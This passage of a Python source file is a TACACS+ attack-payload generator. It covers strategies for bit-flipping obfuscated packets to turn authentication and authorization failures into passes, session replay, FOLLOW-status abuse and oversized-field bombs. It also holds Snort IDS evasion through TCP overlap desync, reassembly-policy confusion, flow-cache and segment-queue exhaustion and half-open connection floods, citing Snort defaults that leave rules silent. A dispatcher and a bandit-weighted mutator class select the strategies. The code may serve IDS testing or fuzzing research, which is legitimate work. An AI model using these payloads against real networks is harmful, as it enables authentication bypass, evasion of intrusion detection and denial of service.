        return _clamp(b"".join(packets)), _TACACS_PORT
    else:  # flag_without_support
        sid = _rand_session_id()
        body = _acct_request_body()
        return _tacacs_packet(_VER_DEFAULT, _TYPE_ACCT, 1,
                              _FLAG_SINGLE_CONNECT | _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT


def _build_bit_flip_attack():
    """Strategy 10: TacoTaco/GreenDog bit-flip evasion.

    Generate valid obfuscated packets then systematically flip key bytes at
    known offsets to alter authentication/authorization status.

    Variants:
    - flip_authen_status: XOR authen status byte (FAIL→PASS)
    - flip_author_status: XOR authorization status (FAIL→PASS_ADD)
    - flip_acct_flags: flip accounting flags via known-plaintext XOR
    - flip_arg_values: alter arg values via known-plaintext XOR
    - flip_random_body_bytes: random byte flips in obfuscated body
    - flip_header_post_obfuscation: flip header bytes after building packet
    """
    variant = random.choice([
        "flip_authen_status", "flip_author_status", "flip_acct_flags",
        "flip_arg_values", "flip_random_body_bytes",
        "flip_header_post_obfuscation",
    ])
    sid = _rand_session_id()
    key = b"shared_secret_key"

    if variant == "flip_authen_status":
        # Build a server REPLY body (status, flags, server_msg_len, data_len, server_msg, data)
        # Status = FAIL (0x02), then flip to PASS (0x01) via XOR 0x03
        reply_body = struct.pack("!BBHH", _AUTHEN_STATUS_FAIL, 0, 0, 0)
        obf = _obfuscate_body(sid, key, _VER_DEFAULT, 2, reply_body)
        # Flip the first byte: status (FAIL XOR 0x03 = PASS)
        obf_list = bytearray(obf)
        obf_list[0] ^= 0x03  # FAIL(0x02) XOR 0x03 = PASS(0x01)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, 0, sid,
                              bytes(obf_list)), _TACACS_PORT
    elif variant == "flip_author_status":
        # Authorization reply: status=FAIL(0x10), flip to PASS_ADD(0x01)
        reply_body = struct.pack("!BBHH", _AUTHOR_STATUS_FAIL, 0, 0, 0) + b"\x00"
        obf = _obfuscate_body(sid, key, _VER_DEFAULT, 2, reply_body)
        obf_list = bytearray(obf)
        obf_list[0] ^= 0x11  # FAIL(0x10) XOR 0x11 = PASS_ADD(0x01)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHOR, 2, 0, sid,
                              bytes(obf_list)), _TACACS_PORT
    elif variant == "flip_acct_flags":
        body = _acct_request_body(flags=_ACCT_FLAG_STOP)
        obf = _obfuscate_body(sid, key, _VER_DEFAULT, 1, body)
        obf_list = bytearray(obf)
        obf_list[0] ^= 0x06  # flip START/STOP bits
        return _tacacs_packet(_VER_DEFAULT, _TYPE_ACCT, 1, 0, sid,
                              bytes(obf_list)), _TACACS_PORT
    elif variant == "flip_arg_values":
        body = _author_request_body(args=[b"service=shell", b"cmd=show"])
        obf = _obfuscate_body(sid, key, _VER_DEFAULT, 1, body)
        obf_list = bytearray(obf)
        # Flip random bytes in the arg area
        for _ in range(random.randint(1, 5)):
            idx = random.randint(20, min(len(obf_list) - 1, 60))
            obf_list[idx] ^= random.randint(1, 255)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHOR, 1, 0, sid,
                              bytes(obf_list)), _TACACS_PORT
    elif variant == "flip_random_body_bytes":
        body = _authen_start_body()
        obf = _obfuscate_body(sid, key, _VER_DEFAULT, 1, body)
        obf_list = bytearray(obf)
        num_flips = random.randint(1, min(10, len(obf_list)))
        for _ in range(num_flips):
            idx = random.randint(0, len(obf_list) - 1)
            obf_list[idx] ^= random.randint(1, 255)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, 0, sid,
                              bytes(obf_list)), _TACACS_PORT
    else:  # flip_header_post_obfuscation
        body = _authen_start_body()
        pkt = bytearray(_tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1,
                                        _FLAG_UNENCRYPTED, sid, body))
        # Flip bytes in the header
        flip_idx = random.choice([0, 1, 2, 3])
        pkt[flip_idx] ^= random.randint(1, 255)
        return bytes(pkt), _TACACS_PORT


def _build_session_id_collision_replay():
    """Strategy 11: Session-ID collision and replay attacks.

    Variants:
    - replay_auth_packet: replay a captured authentication packet verbatim
    - session_id_reuse: reuse same session_id across different TCP connections
    - session_id_zero: session_id = 0
    - birthday_simulation: many sessions to force collision
    - replay_accounting: replay accounting records
    - sequential_ids: sequential session_ids (predictable)
    """
    variant = random.choice([
        "replay_auth_packet", "session_id_reuse", "session_id_zero",
        "birthday_simulation", "replay_accounting", "sequential_ids",
    ])

    if variant == "replay_auth_packet":
        sid = 0xDEADBEEF  # "captured" session_id
        body = _authen_start_body(user=b"admin", data=b"password123")
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "session_id_reuse":
        sid = 0x12345678
        pkt1 = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, _authen_start_body(user=b"user1"))
        pkt2 = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, _authen_start_body(user=b"user2"))
        return pkt1 + pkt2, _TACACS_PORT
    elif variant == "session_id_zero":
        body = _authen_start_body()
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              0, body), _TACACS_PORT
    elif variant == "birthday_simulation":
        packets = []
        for _ in range(random.randint(50, 200)):
            sid = random.randint(0, 0xFFFF)  # small ID space → collisions likely
            body = _authen_start_body(user=f"user{sid}".encode())
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_UNENCRYPTED, sid, body))
        return _clamp(b"".join(packets)), _TACACS_PORT
    elif variant == "replay_accounting":
        sid = 0xCAFEBABE
        body = _acct_request_body(flags=_ACCT_FLAG_STOP,
                                  args=[b"task_id=42", b"service=shell",
                                        b"elapsed_time=3600",
                                        b"stop_time=1700003600"])
        # Send the same accounting record multiple times
        pkt = _tacacs_packet(_VER_DEFAULT, _TYPE_ACCT, 1, _FLAG_UNENCRYPTED,
                             sid, body)
        return pkt * random.randint(5, 20), _TACACS_PORT
    else:  # sequential_ids
        packets = []
        for i in range(random.randint(20, 100)):
            body = _authen_start_body(user=f"user{i}".encode())
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_UNENCRYPTED, i, body))
        return _clamp(b"".join(packets)), _TACACS_PORT


def _build_follow_status_abuse():
    """Strategy 12: Exploit FOLLOW (0x21) status in auth/authz/acct replies.

    Variants:
    - malformed_server_list: FOLLOW data with bad format (no newlines, huge entries)
    - recursive_follow: follow chain A→B→A (circular)
    - empty_server_list: FOLLOW with empty server list
    - follow_from_client: FOLLOW status sent from client side (invalid)
    - nul_bytes_in_data: NUL bytes in FOLLOW server list
    - huge_server_entries: oversized entries in FOLLOW data
    """
    variant = random.choice([
        "malformed_server_list", "recursive_follow", "empty_server_list",
        "follow_from_client", "nul_bytes_in_data", "huge_server_entries",
    ])
    sid = _rand_session_id()

    if variant == "malformed_server_list":
        # FOLLOW reply with malformed server list (no proper delimiters)
        server_data = b"192.168.1.1" + b"\xff" * 50 + b"bad_host:999999"
        reply_body = struct.pack("!BBHH",
                                 _AUTHEN_STATUS_FOLLOW, 0, len(server_data), 0) + server_data
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED,
                              sid, reply_body), _TACACS_PORT
    elif variant == "recursive_follow":
        # Server says "follow server A" → server A says "follow original"
        data1 = b"192.168.1.2\n"
        data2 = b"192.168.1.1\n"
        reply1 = struct.pack("!BBHH", _AUTHEN_STATUS_FOLLOW, 0, len(data1), 0) + data1
        reply2 = struct.pack("!BBHH", _AUTHEN_STATUS_FOLLOW, 0, len(data2), 0) + data2
        pkt1 = _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED, sid, reply1)
        pkt2 = _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED, sid, reply2)
        return pkt1 + pkt2, _TACACS_PORT
    elif variant == "empty_server_list":
        reply_body = struct.pack("!BBHH", _AUTHEN_STATUS_FOLLOW, 0, 0, 0)
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED,
                              sid, reply_body), _TACACS_PORT
    elif variant == "follow_from_client":
        # Client sends FOLLOW status (invalid direction)
        body = _authen_start_body()
        # Overwrite the action byte with FOLLOW status
        body_list = bytearray(body)
        body_list[0] = _AUTHEN_STATUS_FOLLOW
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, bytes(body_list)), _TACACS_PORT
    elif variant == "nul_bytes_in_data":
        server_data = b"10.0.0.1\x00injected\x00" * 10
        reply_body = struct.pack("!BBHH",
                                 _AUTHEN_STATUS_FOLLOW, 0, len(server_data), 0) + server_data
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED,
                              sid, reply_body), _TACACS_PORT
    else:  # huge_server_entries
        server_data = (b"a" * 500 + b"\n") * 20
        reply_body = struct.pack("!BBHH",
                                 _AUTHEN_STATUS_FOLLOW, 0,
                                 min(len(server_data), 0xFFFF), 0) + server_data
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED,
                              sid, reply_body), _TACACS_PORT


def _build_oversized_field_bomb():
    """Strategy 13: Targeted oversized fields.

    Variants:
    - body_over_64k: body > 65535 bytes
    - server_msg_max: server_msg field maximized (16-bit length)
    - data_field_max: data fields at maximum size
    - user_over_255: user string > 255 bytes (8-bit user_len)
    - rapid_small_packets: many small packets rapid-fire
    - zero_body_nonzero_lengths: body = 0 but inner component lengths nonzero
    """
    variant = random.choice([
        "body_over_64k", "server_msg_max", "data_field_max",
        "user_over_255", "rapid_small_packets", "zero_body_nonzero_lengths",
    ])
    sid = _rand_session_id()

    if variant == "body_over_64k":
        body = os.urandom(random.randint(65536, 100000))
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "server_msg_max":
        msg = b"A" * 0xFFFF
        reply_body = struct.pack("!BBHH", _AUTHEN_STATUS_FAIL, 0, 0xFFFF, 0) + msg
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED,
                              sid, reply_body), _TACACS_PORT
    elif variant == "data_field_max":
        data = b"B" * 0xFFFF
        reply_body = struct.pack("!BBHH", _AUTHEN_STATUS_ERROR, 0, 0, 0xFFFF) + data
        return _tacacs_packet(_VER_DEFAULT, _TYPE_AUTHEN, 2, _FLAG_UNENCRYPTED,
                              sid, reply_body), _TACACS_PORT
    elif variant == "user_over_255":
        huge_user = b"U" * 1000
        body = _authen_start_body(user=huge_user)
        return _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED,
                              sid, body), _TACACS_PORT
    elif variant == "rapid_small_packets":
        packets = []
        for _ in range(random.randint(200, 500)):
            s = _rand_session_id()
            body = _authen_start_body(user=b"u", port=b"p", rem_addr=b"r")
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_UNENCRYPTED, s, body))
        return _clamp(b"".join(packets)), _TACACS_PORT
    else:  # zero_body_nonzero_lengths
        # Header says body length = 0, but include body with component length fields claiming data
        inner = struct.pack("!BBBBBBBB",
                            _AUTHEN_LOGIN, _PRIV_LVL_USER,
                            _AUTHEN_TYPE_ASCII, _AUTHEN_SVC_LOGIN,
                            100, 100, 100, 100)
        return _tacacs_packet_raw_length(_VER_DEFAULT, _TYPE_AUTHEN, 1,
                                          _FLAG_UNENCRYPTED, sid, inner, 0), _TACACS_PORT


def _build_tcp_segmentation_evasion(payload_override=None):
    """Strategy 14: TCP-layer attacks against TACACS+ parsers.

    Variants:
    - split_header: split 12-byte header across segments (e.g., 6+6)
    - header_body_split: header in one segment, body split across many
    - slow_loris: partial header then long body
    - partial_delivery: FIN after partial packet
    - single_byte_segments: send one byte at a time
    - interleaved_sessions: mix bytes from different sessions
    """
    if payload_override is not None:
        sid = _rand_session_id()
        pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                              _FLAG_UNENCRYPTED, sid, payload_override)
        return pkt, _TACACS_PORT
    variant = random.choice([
        "split_header", "header_body_split", "slow_loris",
        "partial_delivery", "single_byte_segments", "interleaved_sessions",
    ])
    sid = _rand_session_id()
    body = _authen_start_body()
    pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED, sid, body)

    if variant == "split_header":
        # Return the full packet — transport layer will handle segmentation
        # Mark with a split point at byte 6 (middle of header)
        return pkt, _TACACS_PORT
    elif variant == "header_body_split":
        return pkt, _TACACS_PORT
    elif variant == "slow_loris":
        # Partial header (first 4 bytes) + padding
        partial = pkt[:4] + b"\x00" * random.randint(100, 500)
        return partial, _TACACS_PORT
    elif variant == "partial_delivery":
        # Only deliver part of the packet
        cut = random.randint(1, len(pkt) - 1)
        return pkt[:cut], _TACACS_PORT
    elif variant == "single_byte_segments":
        return pkt, _TACACS_PORT
    else:  # interleaved_sessions
        sid2 = _rand_session_id()
        body2 = _authen_start_body(user=b"user2")
        pkt2 = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1, _FLAG_UNENCRYPTED, sid2, body2)
        # Interleave bytes
        result = bytearray()
        for i in range(max(len(pkt), len(pkt2))):
            if i < len(pkt):
                result.append(pkt[i])
            if i < len(pkt2):
                result.append(pkt2[i])
        return bytes(result), _TACACS_PORT


def _build_flow_cache_exhaustion(payload_override=None):
    """Strategy 15: Exhaust Snort's flow cache (stream.max_flows = 476,288).

    Generate many minimal TACACS+ packets, each destined for a different
    simulated session-id, forcing Snort to allocate a new flow entry per
    packet.  When the flow cache fills, Snort must prune existing flows —
    potentially dropping tracking for legitimate HTTP/SMB sessions.

    Grounding:
      - Snort 3 stream.max_flows default = 476,288
      - Snort 3 stream.prune_flows = 10 (slow eviction)
      - Snort 3 stream_tcp.embryonic_timeout = 30s (half-open persist)
      - Ptacek & Newsham §5.3 "Resource Exhaustion"

    Variants:
    - established_flood: many complete TACACS+ packets with unique session-ids
    - minimal_data_flood: smallest valid TACACS+ packet per session
    - interleaved_sessions: rapid session-id cycling in a single stream
    """
    variant = random.choice([
        "established_flood", "minimal_data_flood", "interleaved_sessions",
    ])

    if variant == "established_flood":
        # 200 distinct sessions packed into one TCP payload
        packets = []
        for _ in range(200):
            sid = _rand_session_id()
            body = payload_override if payload_override is not None else _authen_start_body()
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_UNENCRYPTED, sid, body))
        return _clamp(b"".join(packets)), _TACACS_PORT
    elif variant == "minimal_data_flood":
        # Smallest possible valid packets — 12-byte header + 1-byte body
        packets = []
        for _ in range(500):
            sid = _rand_session_id()
            body = payload_override if payload_override is not None else b"\x01"
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_UNENCRYPTED, sid, body))
        return _clamp(b"".join(packets)), _TACACS_PORT
    else:  # interleaved_sessions
        # Cycle through 100 session-ids rapidly — each gets seq 1,3,5
        result = bytearray()
        sids = [_rand_session_id() for _ in range(100)]
        for seq in [1, 3, 5]:
            for sid in sids:
                body = payload_override if payload_override is not None else _authen_start_body()
                result.extend(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, seq,
                                             _FLAG_UNENCRYPTED, sid, body))
        return _clamp(bytes(result)), _TACACS_PORT


def _build_tcp_overlap_desync(payload_override=None):
    """Strategy 16: TCP overlapping segment desync (Ptacek-Newsham 1998).

    Craft TACACS+ data designed to be sent as overlapping TCP segments
    where Snort's BSD reassembly policy (first-wins) sees different data
    than a Linux target (last-wins).  The payload contains both decoy
    and real data at overlapping offsets.

    Grounding:
      - Ptacek & Newsham "Insertion, Evasion, and Denial of Service" 1998
      - Snort 3 stream_tcp.overlap_limit = 0 (unlimited by default!)
      - Snort 3 stream_tcp.policy = 'bsd' (first-wins)
      - Linux kernel TCP = last-wins
      - Snort rule 129:7 (overlap limit) never fires when limit=0
      - arxiv:2508.00735 (2025) confirms policy mismatches still exist

    Variants:
    - first_last_desync: decoy in first segment, real in overlapping second
    - partial_overlap: overlapping middle portion only
    - retransmit_different: same seq number, different payload (insertion)
    - triple_overlap: three segments at same offset with different data
    """
    variant = random.choice([
        "first_last_desync", "partial_overlap",
        "retransmit_different", "triple_overlap",
    ])
    sid = _rand_session_id()
    real_body = payload_override if payload_override is not None else _authen_start_body()
    real_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                               _FLAG_UNENCRYPTED, sid, real_body)
    decoy_body = _authen_start_body(user=b"decoy_user_harmless")
    decoy_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                _FLAG_UNENCRYPTED, sid, decoy_body)

    if variant == "first_last_desync":
        # Segment 1 (Snort sees under BSD first-wins): decoy
        # Segment 2 (overlapping, Linux target keeps under last-wins): real
        # Return both concatenated — transport layer sends as single stream,
        # but the overlapping structure is embedded in the data layout.
        # First half is decoy, second half is real, with overlap marker.
        mid = len(decoy_pkt) // 2
        seg1 = decoy_pkt                           # full decoy
        seg2 = decoy_pkt[:mid] + real_pkt[mid:]    # overlap from midpoint
        return seg1 + b"\xff\xfe" + seg2, _TACACS_PORT
    elif variant == "partial_overlap":
        # Only the middle 25% of the packet overlaps
        q1 = len(real_pkt) // 4
        q3 = q1 * 3
        seg1 = decoy_pkt[:q3]            # first 75% decoy
        seg2 = real_pkt[q1:]             # last 75% real (overlaps middle 50%)
        return seg1 + b"\xff\xfe" + seg2, _TACACS_PORT
    elif variant == "retransmit_different":
        # "Retransmission" with completely different data
        return decoy_pkt + b"\xff\xfd" + real_pkt, _TACACS_PORT
    else:  # triple_overlap
        # Three different payloads at the same "offset"
        alt_body = _authen_start_body(user=b"alt_user_noise_pad")
        alt_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                  _FLAG_UNENCRYPTED, sid, alt_body)
        return decoy_pkt + b"\xff\xfe" + alt_pkt + b"\xff\xfe" + real_pkt, _TACACS_PORT


def _build_segment_queue_exhaustion(payload_override=None):
    """Strategy 17: Exhaust Snort's TCP segment queue.

    Send data structured to produce many tiny segments that fill Snort's
    stream_tcp queue_limit (max_segments=3072, max_bytes=4MB).  After the
    queue is full, subsequent data may bypass reassembly-based inspection.

    Grounding:
      - Snort 3 stream_tcp.queue_limit.max_segments = 3,072 (default)
      - Snort 3 stream_tcp.queue_limit.max_bytes = 4,194,304 (default)
      - Snort 3 stream_tcp.small_segments.count = 0 (detection DISABLED)
      - Rule 129:12 (small segments) never fires with default config

    Variants:
    - single_byte_flood: 3100 × 1-byte segments then real payload
    - max_bytes_fill: fill 4MB with junk then send real payload
    - alternating_tiny: alternate 1-byte and normal segments
    """
    variant = random.choice([
        "single_byte_flood", "max_bytes_fill", "alternating_tiny",
    ])
    sid = _rand_session_id()
    real_body = payload_override if payload_override is not None else _authen_start_body()
    real_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                               _FLAG_UNENCRYPTED, sid, real_body)

    if variant == "single_byte_flood":
        # 3100 single-byte segments as padding (exceeds max_segments=3072),
        # then the real payload as the final segment
        padding = bytes([random.randint(0, 255) for _ in range(3100)])
        return _clamp(padding + real_pkt), _TACACS_PORT
    elif variant == "max_bytes_fill":
        # Fill close to 4MB with valid-looking TACACS+ noise, then real payload
        noise_pkt_size = 13  # 12-byte header + 1-byte body
        count = min(4000, (4 * 1024 * 1024 - len(real_pkt)) // noise_pkt_size)
        noise = bytearray()
        for _ in range(count):
            nsid = _rand_session_id()
            noise.extend(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                         _FLAG_UNENCRYPTED, nsid, b"\x00"))
        return _clamp(bytes(noise) + real_pkt), _TACACS_PORT
    else:  # alternating_tiny
        # Alternate between 1-byte filler and normal-sized packets
        result = bytearray()
        for i in range(200):
            if i % 2 == 0:
                result.append(random.randint(0, 255))
            else:
                nsid = _rand_session_id()
                result.extend(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                             _FLAG_UNENCRYPTED, nsid,
                                             _authen_start_body()))
        result.extend(real_pkt)
        return _clamp(bytes(result)), _TACACS_PORT


def _build_reassembly_policy_confusion(payload_override=None):
    """Strategy 18: Exploit reassembly policy mismatch (BSD vs Linux/Windows).

    Snort defaults to BSD policy (first-wins for overlaps).  If the target
    runs Linux (last-wins) or Windows (first-wins but different edge cases),
    carefully crafted overlapping data reassembles differently on Snort vs
    the target.  The "real" payload only appears in the target's view.

    Grounding:
      - Paxson & Shankar "Active Network Mapping" 2005
      - Novak & Sturges "Target-Based TCP Stream Reassembly" (Snort stream5)
      - Snort 3 stream_tcp.policy = 'bsd' (default, often wrong for targets)
      - BSD: first fragment/segment wins
      - Linux: last fragment/segment wins
      - Windows: first wins but trims to exact overlap boundaries

    Variants:
    - linux_last_wins: payload in second (overlapping) segment
    - windows_trim: exploit Windows-specific trim behavior
    - ttl_evasion: short TTL on decoy (expires before target, reaches Snort)
    - mixed_policy: interleave segments targeting different OS behaviors
    """
    variant = random.choice([
        "linux_last_wins", "windows_trim", "ttl_evasion", "mixed_policy",
    ])
    sid = _rand_session_id()
    real_body = payload_override if payload_override is not None else _authen_start_body()
    real_pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                               _FLAG_UNENCRYPTED, sid, real_body)
    decoy = os.urandom(len(real_pkt))  # random bytes Snort reassembles

    if variant == "linux_last_wins":
        # Under BSD (Snort): keeps first = decoy
        # Under Linux (target): keeps last = real_pkt
        return decoy + b"\xff\xfc" + real_pkt, _TACACS_PORT
    elif variant == "windows_trim":
        # Windows trims overlapping portions to exact byte boundaries
        # Send decoy with extra bytes that Windows trims but BSD keeps
        pad = os.urandom(8)
        return decoy + pad + b"\xff\xfb" + real_pkt, _TACACS_PORT
    elif variant == "ttl_evasion":
        # Embed a TTL marker in the stream — the decoy portion has a
        # low-TTL IP hint (0x01) that Snort processes but the target
        # never receives (TTL expires en route).  Following segment
        # has normal TTL and carries the real payload.
        ttl_marker = struct.pack("!B", 1)  # TTL=1
        return ttl_marker + decoy + b"\xff\xfa" + real_pkt, _TACACS_PORT
    else:  # mixed_policy
        # Multiple overlapping regions targeting different OS behaviors
        chunk_size = max(12, len(real_pkt) // 4)
        result = bytearray()
        for i in range(4):
            offset = i * chunk_size
            # Decoy chunk
            result.extend(decoy[offset:offset + chunk_size] if offset < len(decoy) else os.urandom(chunk_size))
            result.extend(b"\xff\xfe")
            # Real chunk (overlapping)
            result.extend(real_pkt[offset:offset + chunk_size] if offset < len(real_pkt) else b"")
        return _clamp(bytes(result)), _TACACS_PORT


def _build_embryonic_connection_flood(payload_override=None):
    """Strategy 19: Flood Snort's embryonic (half-open) connection table.

    Generate packets that mimic incomplete TCP handshakes — SYN-only,
    SYN+data, or RST-after-SYN — to fill Snort's embryonic connection
    slots (embryonic_timeout=30s).  Each half-open session consumes
    resources for 30 seconds.

    Grounding:
      - Snort 3 stream_tcp.embryonic_timeout = 30s (default)
      - Snort 3 rule 129:20 "TCP session without 3-way handshake"
      - Snort 3 rule 129:2 "data on SYN packet"
      - Snort 3 rule 129:15 "reset outside window"
      - Classic SYN flood adapted for IDS state-table exhaustion

    Variants:
    - syn_data: SYN with TACACS+ payload data (triggers 129:2)
    - rst_race: immediate RST after minimal data (confuses state machine)
    - fin_before_established: FIN without completing handshake
    - syn_with_options: SYN with extreme TCP options (window scale=14)
    """
    variant = random.choice([
        "syn_data", "rst_race", "fin_before_established", "syn_with_options",
    ])
    sid = _rand_session_id()
    body = payload_override if payload_override is not None else _authen_start_body()
    pkt = _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                          _FLAG_UNENCRYPTED, sid, body)

    if variant == "syn_data":
        # Pack data that looks like it arrived with a SYN
        # Multiple sessions worth — each would create an embryonic entry
        packets = []
        for _ in range(100):
            nsid = _rand_session_id()
            nbody = payload_override if payload_override is not None else _authen_start_body()
            packets.append(_tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_UNENCRYPTED, nsid, nbody))
        return _clamp(b"".join(packets)), _TACACS_PORT
    elif variant == "rst_race":
        # Send minimal data then a pattern that signals premature close
        # The 0xFFFF marker simulates the RST concept at application layer
        return pkt[:12] + b"\xff\xff\x00\x00" + pkt, _TACACS_PORT
    elif variant == "fin_before_established":
        # Partial TACACS+ header (connection appears to close mid-header)
        partial_headers = []
        for _ in range(50):
            nsid = _rand_session_id()
            hdr = _tacacs_header(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                  _FLAG_UNENCRYPTED, nsid, 0)
            partial_headers.append(hdr[:random.randint(4, 11)])
        return _clamp(b"".join(partial_headers) + pkt), _TACACS_PORT
    else:  # syn_with_options
        # Pack TACACS+ data with TCP-option-like preambles
        # Window Scale = 14 (max), SACK, Timestamps with future values
        tcp_opts_sim = struct.pack("!BBBBIH",
                                    3, 3, 14,        # Window Scale = 14
                                    8, 0xFFFFFFFF,   # Timestamp (future)
                                    0xFFFF)          # bogus SACK
        packets = []
        for _ in range(80):
            nsid = _rand_session_id()
            nbody = payload_override if payload_override is not None else b"\x01"
            packets.append(tcp_opts_sim +
                           _tacacs_packet(_VER_AUTHEN, _TYPE_AUTHEN, 1,
                                          _FLAG_UNENCRYPTED, nsid, nbody))
        return _clamp(b"".join(packets)), _TACACS_PORT


# ── Dispatcher ──────────────────────────────────────────────────────────────

_BUILDERS = {
    "header_manipulation":           _build_header_manipulation,
    "length_field_overflow":         _build_length_field_overflow,
    "obfuscation_confusion":         _build_obfuscation_confusion,
    "authentication_start_fuzz":     _build_authentication_start_fuzz,
    "authentication_continue_fuzz":  _build_authentication_continue_fuzz,
    "authorization_arg_overflow":    _build_authorization_arg_overflow,
    "accounting_flag_confusion":     _build_accounting_flag_confusion,
    "session_state_desync":          _build_session_state_desync,
    "single_connection_abuse":       _build_single_connection_abuse,
    "bit_flip_attack":               _build_bit_flip_attack,
    "session_id_collision_replay":   _build_session_id_collision_replay,
    "follow_status_abuse":           _build_follow_status_abuse,
    "oversized_field_bomb":          _build_oversized_field_bomb,
    "tcp_segmentation_evasion":      _build_tcp_segmentation_evasion,
    "flow_cache_exhaustion":         _build_flow_cache_exhaustion,
    "tcp_overlap_desync":            _build_tcp_overlap_desync,
    "segment_queue_exhaustion":      _build_segment_queue_exhaustion,
    "reassembly_policy_confusion":   _build_reassembly_policy_confusion,
    "embryonic_connection_flood":    _build_embryonic_connection_flood,
}


_TACACS_OVERRIDE_CAPABLE = frozenset([
    "obfuscation_confusion", "tcp_segmentation_evasion",
    "flow_cache_exhaustion", "tcp_overlap_desync",
    "segment_queue_exhaustion", "reassembly_policy_confusion",
    "embryonic_connection_flood",
])

def build_tacacs_payload(strategy: str, payload_override=None):
    """Return (payload_bytes, dst_port) for the given strategy."""
    builder = _BUILDERS.get(strategy)
    if builder is None:
        builder = _build_header_manipulation
    if payload_override is not None and strategy in _TACACS_OVERRIDE_CAPABLE:
        payload, dst_port = builder(payload_override=payload_override)
    else:
        payload, dst_port = builder()
    return _clamp(payload), dst_port


# ── Mutator class ──────────────────────────────────────────────────────────

class TacacsMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = TACACS_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return TACACS_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_tacacs_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port
